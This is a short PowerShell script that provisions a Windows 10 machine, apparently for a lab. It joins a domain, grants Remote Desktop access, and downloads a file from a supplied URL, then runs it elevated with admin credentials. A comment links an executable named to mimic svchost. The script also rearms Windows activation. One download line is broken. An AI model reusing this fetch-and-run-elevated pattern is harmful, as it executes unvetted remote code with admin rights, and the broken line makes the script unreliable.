### Basic non-Parameterized ps1 script to allow introduction of various limited-provisioning commands to Windows 10
param(
  [String]$defAdminUsr, 
  [String]$defAdminPwd,
  [String]$domain,
  [String]$domAdminUsr,
  [String]$domAdminPwd,
  [String]$localpath,
  [String]$downloadlink
)

$temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
$localcred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $defAdminUsr,$temppwd

$temppwd = ConvertTo-SecureString -String $domAdminPwd -AsPlainText -Force
$domaincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($domain + "\" + $domAdminUsr),$temppwd

add-computer -domainname $domain -domaincredential $domaincred
Add-LocalGroupMember -group "Remote Desktop Users" -member $domAdminUsr

Invoke-WebRequest -uri $downloadlink -OutFile $localpath

Invoke-WebRequest -uri "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.ps1" -OutFile 
Start-Process powershell.exe -argumentlist "C:\Users\cmtsadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runadm.ps1" -credential $localcred


# https://github.com/cybermias/publicrep/raw/master/guacconf/Python.37.svchost.exe
# c:\users\cmtsadmin\searches\python37.svchost.exe 

Start-Process powershell.exe -verb runas -ArgumentList "start-process -filepath $localpath -Credential $localcred"



cscript c:\windows\system32\slmgr.vbs /rearm
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\" /v "PagingFiles" /t REG_MULTI_SZ /d "D:\pagefile.sys 0 0" /f

shutdown /r /t 03
